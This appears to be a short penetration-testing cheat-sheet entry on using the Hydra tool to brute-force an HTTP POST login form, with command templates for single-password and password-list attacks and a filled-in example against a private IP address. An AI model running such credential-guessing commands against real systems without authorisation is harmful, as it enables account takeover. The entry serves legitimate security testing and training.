# Hydra

Protocol brute-forcing tool

## Brute force HTTP login page

* Single password

```bash
hydra -L <user list> -p <password> <target hostname / IP> http-post-form '<uri>:<user parameter>=^USER^&<password parameter>=^PASS^:F=<failure string>' -v
```

* Password list

```bash
hydra -L <user list> -P <password list> <target hostname / IP> http-post-form '<uri>:<user parameter>=^USER^&<password parameter>=^PASS^:F=<failure string>' -v
```

* Example:

```bash
hydra -L users.txt -p Password123 10.10.10.10 http-post-form '/api/login:username=^USER^&password=^PASS^:F=failed' -v
```
